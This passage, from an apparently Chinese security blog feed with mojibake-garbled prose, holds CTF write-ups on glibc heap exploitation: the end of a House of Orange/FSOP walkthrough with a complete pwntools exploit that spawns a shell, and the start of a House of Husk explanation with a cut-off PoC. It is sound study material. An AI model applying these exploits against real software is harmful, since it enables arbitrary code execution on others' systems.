å„ä¸ªå­—æ®µçš„å€¼æ¥å®ŒæˆFSOPã€‚</p><p>å°†_flagså­—æ®µå†™å…¥&#x2F;bin&#x2F;sh</p><p>å°† _IO_write_ptræ”¹æˆ0x1 </p><p>å°† _IO_write_endæ”¹æˆ0x0</p><p>å°†_modeæ”¹æˆ0</p><p>å°†vtableçš„åœ°å€æ”¹æˆ&amp;vtable</p><p>ç„¶ååœ¨vtableå­—æ®µåå†è·Ÿ16ä¸ªå­—èŠ‚çš„0æœ€åå†™ä¸Šsystemå‡½æ•°çš„åœ°å€å³å¯ã€‚</p><p>å¸ƒå±€å®Œæˆåï¼Œç»“æ„ä½“ä¸­çš„æ•°æ®åº”è¯¥å¦‚ä¸‹ï¼š</p><p><img src="/../img/image-20221007234516300.png" alt="image-20221007234516300"></p><p>ç„¶åç­‰æ‰§è¡Œlibc_messageçš„æ—¶å€™ä¼šè°ƒç”¨abortæœ€åè§¦å‘_IO_flush_all_lockpï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰æˆ‘ä»¬å·²ç»å¸ƒå±€å¥½äº†IO_FILEç»“æ„ä½“ä¸­çš„å„ä¸ªå€¼ã€‚æœ€ç»ˆåˆ°_IO_overflowæ—¶è§¦å‘system(â€œ&#x2F;bin&#x2F;sh\x00â€)è·å–shellã€‚</p><p>unsorted bin attackå’ŒFSOPæ”»å‡»éƒ½æ˜¯æ„é€ æ•°æ®åœ¨ä¸€ä¸ªpayloadé‡Œçš„ã€‚</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size åŒæ—¶ä¹Ÿæ˜¯fake fileçš„_flagså­—æ®µ</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸‹è¿™é¢˜çš„æ•´ä½“æµç¨‹ï¼šé¦–å…ˆåˆ©ç”¨æº¢å‡ºæ¥ç¯¡æ”¹top chunkçš„sizeå­—æ®µï¼Œç”³è¯·ä¸€ä¸ªå¤§çš„sizeæ¥æ‰“ä¸€ä¸ªhouse of orangeè®©å †å—è¿›å…¥unsorted binä¸­ï¼Œç„¶åç”³è¯·å‡ºæ¥çš„sizeè¦å±äºlarge binçš„èŒƒå›´è¿™æ ·å°±å¯ä»¥åŒæ—¶æ³„éœ²å‡ºlibcå’Œå †åœ°å€äº†ã€‚æ­¤æ—¶æˆ‘ä»¬çš„unsorted binä¸­ä¾ç„¶æœ‰å †å—ï¼Œæˆ‘ä»¬å»åˆ©ç”¨æº¢å‡ºæ‰“ä¸€ä¸ªunsorted bin attackï¼Œå°†_IO_list_allä¸­å†™å…¥main_arena+88ï¼Œè¿™å°±å·²ç»æ§åˆ¶äº†ç¬¬ä¸€ä¸ªIO_FILEç»“æ„ä½“åœ°å€äº†ï¼Œä½†æ˜¯é‡Œé¢çš„å­—æ®µæˆ‘ä»¬æ§åˆ¶ä¸äº†ï¼Œä¸è¿‡è¯¥ç»“æ„ä½“çš„chainå­—æ®µåœ°å€ä½äºsmall binä¸­sizeä¸º0x60çš„æ•°ç»„ï¼Œæˆ‘ä»¬å°†unsorted binä¸­è¿™ä¸ªå †å—çš„sizeç”¨æº¢å‡ºæ”¹ä¸º0x61ï¼Œè¿™æ ·å†æ¬¡ç”³è¯·å‡ºæ¥åæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ç¬¬äºŒä¸ªIO_FILEç»“æ„ä½“äº†ï¼Œå¸ƒç½®å¥½éœ€è¦ç»•è¿‡æ£€æŸ¥çš„æ•°æ®æœ€åæ‰“ä¸€ä¸ªFSOPå³å¯è·å–shellã€‚</p><h5 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h5><p>house of orangeåˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ€åç¨‹åºè§¦å‘abortåˆ·æ–°æµçš„åŸå› æ˜¯åœ¨unsorted bin attackæ‰“å®Œä¹‹å åœ¨ç¬¬äºŒæ¬¡éå†unsorted binç»™å †å—åˆ†ç±»çš„æ—¶å€™ ç”±äºunsorted binå·²ç»è¢«ç ´åï¼Œç„¶åvictimå·²ç»æ˜¯ä¸€ä¸ªlibcåœ°å€(åœ¨ä¸‹é¢çš„è¿™å¼ å›¾ç‰‡è¯¥åœ°å€æ˜¯io_list_all-0x10çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¯¡æ”¹bkæŒ‡é’ˆçš„å€¼)ï¼Œè€Œå…¶å¯¹åº”çš„sizeä½æ˜¯0ï¼Œä»è€Œæ²¡æœ‰é€šè¿‡æ£€æŸ¥(å¦‚ä¸‹)ï¼Œæœ€ç»ˆè§¦å‘äº†abort</p><p><img src="/../img/image-20221019205258333.png" alt="image-20221019205258333"></p><p><img src="/../img/image-20221019205404478.png" alt="image-20221019205404478"></p><h4 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x13FD</span></span><br><span class="line">d_e=<span class="number">0x1415</span></span><br><span class="line">d_s=<span class="number">0x1409</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    </span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_s)</span></span><br><span class="line">    payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size åŒæ—¶ä¹Ÿæ˜¯fake fileçš„_flagså­—æ®µ</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">    edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007234548743.png" alt="image-20221007234548743"></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.anquanke.com/post/id/218887#h3-5">House of orange - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_45595732/article/details/110173579">(41æ¡æ¶ˆæ¯) FSOP_TTYflagçš„åšå®¢-CSDNåšå®¢</a></p><p>[]<a href="https://bbs.pediy.com/thread-272098.htm#msg_header_h3_16">åŸåˆ›] CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html#houseoforange_hitcon_2016">houseoforange_hitcon_2016 - LynneHuan - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org)</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FSOP </tag>
            
            <tag> house of orange </tag>
            
            <tag> unsorted bin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhouse of huskçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/6c83c2a2.html"/>
      <url>/posts/6c83c2a2.html</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><blockquote><p>ä»‹ç»ï¼š</p><p><code>house of husk</code> æ˜¯å¯¹ <code>printf</code> å‡½æ•°å†…éƒ¨è¿›è¡Œæ³¨å†Œçš„è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å‡½æ•°æŒ‡é’ˆè¿›è¡Œäº†åŠ«æŒ</p><p>ä½¿ç”¨ç‰ˆæœ¬ï¼š</p><p>ç»è¿‡æµ‹è¯•ï¼Œ<code>glibc 2.23--2.35</code> ç‰ˆæœ¬ä¸­ï¼Œè¯¥æ‰‹æ³•å‡å¯ç”¨</p><p>æ¼æ´åŸç†ï¼š</p><p><code>printf</code> å‡½æ•°é€šè¿‡æ£€æŸ¥ <code>__printf_function_table</code> æ˜¯å¦ä¸ºç©ºï¼Œæ¥åˆ¤æ–­æ˜¯å¦æœ‰è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚æœåˆ¤å®šä¸ºæœ‰çš„è¯ï¼Œåˆ™ä¼šå»æ‰§è¡Œ <code>__printf_arginfo_table[spec]</code> å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è¿™æœŸé—´å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•åœ°å€çš„åˆæ³•æ€§æ£€æŸ¥</p><p>åˆ©ç”¨æ–¹æ³•ï¼š</p><p>åŠ«æŒ <code>__printf_function_table</code> ä½¿å…¶ä¸ä¸ºç©ºï¼ŒåŠ«æŒ <code>__printf_arginfo_table</code> ä½¿å…¶è¡¨ä¸­å­˜æ”¾çš„ <code>spec</code> çš„ä½ç½®æ˜¯ <code>backdoor()</code> ï¼Œæ‰§è¡Œåˆ° <code>printf</code> å‡½æ•°æ—¶å°±å¯ä»¥å°†æ‰§è¡ŒæµåŠ«æŒåˆ° <code>backdoor()</code></p><p>specæ˜¯æ ¼å¼åŒ–å­—ç¬¦ï¼Œæ¯”å¦‚æœ€åè°ƒç”¨çš„æ˜¯ <code>printf(&quot;%X\n&quot;,a)</code>,é‚£ä¹ˆåº”è¯¥å°† <code>__printf_arginfo_table[88]</code> çš„ä½ç½®å†™å…¥ <code>backdoor()</code></p><p>ä½¿ç”¨å‰æï¼š</p><ol><li><p>èƒ½å‘ <code>__printf_function_table</code> ä¸­å†™å…¥ä»»æ„æ•°æ®ï¼Œä½¿å…¶ä¸ä¸ºç©º</p></li><li><p>èƒ½å‘ <code>__printf_arginfo_table</code> ä¸­å†™å…¥ä¸€ä¸ªå¯æ§åœ°å€</p></li><li><p>é€šè¿‡æ¡ä»¶ <code>2</code> ,è®© <code>__printf_arginfo_table[spec]</code> ä¸º <code>backdoor</code> åœ°å€</p></li></ol><p>æ”»å‡»æ•ˆæœï¼š</p><p>æ‰§è¡Œåˆ° <code>printf</code> å‡½æ•°æ—¶ï¼Œå°±å¯ä»¥è·³è½¬åˆ° <code>backdoor</code> ä¸Š</p></blockquote><p>æœ¬æ–‡å‡ºç°çš„ <code>glibc</code> æºç å‡ä¸º <code>2.27</code> ç‰ˆæœ¬</p><p>é¦–å…ˆè¦å…ˆè®¤è¯†ä¸‹ <code>__register_printf_function</code> å‡½æ•°,è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦å¹¶è¿›è¡Œæ³¨å†Œï¼ˆæ³¨å†Œçš„æ„æ€æ˜¯è¯´å°†è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ä¸ç›¸åº”çš„å¤„ç†å‡½æ•°ç›¸å…³è”ï¼‰ï¼Œä»¥æ‰“å°ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®ç±»å‹çš„æ•°æ®ã€‚</p><p><code>__register_printf_function</code> å‡½æ•°æ˜¯å¯¹ <code>__register_printf_specifier</code> è¿›è¡Œçš„å°è£…ï¼Œä¸‹é¢æ˜¯ <code>__register_printf_specifier</code> çš„æºä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>spec</code> æ˜¯è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼ˆä»¥ <code>ASCII</code> æ‰€è¡¨ç¤ºï¼‰ï¼Œæ¯”å¦‚ä½ ä½¿ç”¨ <code>%a</code> è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ¥è¾“å‡ºè‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œé‚£ä¹ˆ <code>spec</code> å°±æ˜¯å­—ç¬¦ <code>a</code></p><p>ä¸Šé¢çš„ä»£ç å…ˆåšäº†ç¬¬ä¸€ä¸ª <code>if</code> åˆ¤æ–­ï¼Œè¦ç¡®å®š <code>spec</code> ä½äº <code>0</code> å’Œ <code>0xff</code> ä¹‹é—´ï¼Œå¦‚æœä¸åœ¨ <code>ASCII</code> ç å°±ä¼šè¿”å› <code>-1</code></p><p>ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯å¦‚æœ <code>__printf_function_table</code> ä¸ºç©ºï¼Œé‚£ä¹ˆå°±é€šè¿‡ <code>calloc</code> æ¥åˆ†é…ä¸¤ä¸ªç´¢å¼•è¡¨ï¼Œå¹¶å°†åœ°å€å­˜æ”¾åˆ°  <code>__printf_arginfo_table</code> å’Œ <code>__printf_function_table</code> ä¸­ã€‚ä¸¤ä¸ªè¡¨çš„å¤§å°éƒ½ä¸º <code>0x100</code> ï¼Œå¯ä»¥ç»™ <code>0~0xff</code> çš„æ¯ä¸ªå­—ç¬¦æ³¨å†Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼ˆå‡è®¾æˆ‘å®šä¹‰ä¸€ä¸ª <code>%X</code> çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œé‚£ä¹ˆ <code>spec</code> å°±æ˜¯ <code>88</code> ï¼Œæ‰€ä»¥å°† <code>__printf_arginfo_table[88]</code> æ­¤å¤„å­˜æ”¾ä¸€ä¸ªå¯¹åº”å¤„ç†å‡½æ•°çš„æŒ‡é’ˆï¼‰</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¥ä¸‹æ¥çš„åˆ©ç”¨å¹¶ä¸ä¼šè°ƒç”¨åˆ°ä¸Šé¢è¿™ä¸ªå‡½æ•°ï¼Œä½†éœ€è¦ç”¨åˆ°è¿™ä¸ªæ³¨å†Œè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å‰ç½®çŸ¥è¯†ã€‚</strong></p><p><code>printf</code> å‡½æ•°è°ƒç”¨äº† <code>vfprintf</code> å‡½æ•°ï¼Œä¸‹é¢çš„ä»£ç æ˜¯ <code>vprintf</code> å‡½æ•°ä¸­çš„éƒ¨åˆ†ç‰‡æ®µï¼Œå¯ä»¥çœ‹å‡ºæ¥å¦‚æœ <code>__printf_function_table</code> ä¸ä¸ºç©ºï¼ˆä¹Ÿå°±æ„å‘³ç€æœ‰è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦è¢«æ³¨å†Œè¿‡äº†ï¼‰é‚£ä¹ˆå°±ä¼šè°ƒç”¨ <code>printf_positional</code> å‡½æ•°,å¦‚æœä¸ºç©ºçš„è¯ï¼Œå°±ä¼šå»æ‰§è¡Œé»˜è®¤æ ¼å¼åŒ–å­—ç¬¦çš„ä»£ç éƒ¨åˆ†ï¼ˆå› æ­¤<strong>æ£€æŸ¥è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦æ˜¯ä¼˜å…ˆäºé»˜è®¤çš„æ ¼å¼åŒ–å­—ç¬¦</strong>ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è€Œ <code>printf_positional</code> å‡½æ•°ä¸­ä¼šåœ¨ä¸‹é¢è¿™ä¸ªä½ç½®è°ƒç”¨ <code>__parse_one_specmb</code> å‡½æ•°</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png" alt="image-20230213205442536"></p><p><code>__parse_one_specmb</code> å‡½æ•°ä¸­æœ€å…³é”®çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ªç‰‡æ®µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€åæ‰§è¡Œäº† <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> è¿™é‡Œæœ¬åº”æ˜¯æ³¨å†Œçš„æ­£å¸¸çš„å‡½æ•°æŒ‡é’ˆï¼Œä½†å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç¯¡æ”¹ <code>__printf_arginfo_table</code> ä¸­å­˜æ”¾çš„åœ°å€ï¼Œå°†å…¶æ”¹ä¸ºæˆ‘ä»¬å¯æ§çš„å†…å­˜åœ°å€ï¼Œè¿™æ ·æˆ‘åªéœ€è¦åœ¨ <code>__printf_arginfo_table[88]</code> ï¼ˆä»¥ <code>%X</code> ä¸ºä¾‹ï¼‰çš„ä½ç½®å­˜æ”¾ä¸€ä¸ª <code>one_gadget</code> çš„åœ°å€ï¼Œæ‰§è¡Œåˆ°å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å³å¯è·³è½¬åˆ° <code>one_gadget</code> ä¸Šï¼ˆå¦‚ä¸‹ï¼‰ </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png" alt="image-20230213210814663"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png" alt="image-20230213210736611"></p><p> <strong>æ³¨æ„ï¼šä¸Šé¢çš„åˆ©ç”¨å§‹ç»ˆéƒ½æ²¡æœ‰æ³¨å†Œè‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œè€Œæ˜¯é€šè¿‡ç›´æ¥ç¯¡æ”¹ <code>__printf_function_table</code> æ¥é”™è®©ç¨‹åºä»¥ä¸ºå­˜åœ¨æ³¨å†Œè¿‡çš„è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ï¼Œä»è€Œè§¦å‘ <code>__printf_arginfo_table</code> ä¸­çš„å‡½æ•°æŒ‡é’ˆ</strong></p><p><code>poc</code> æºè‡ª  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span 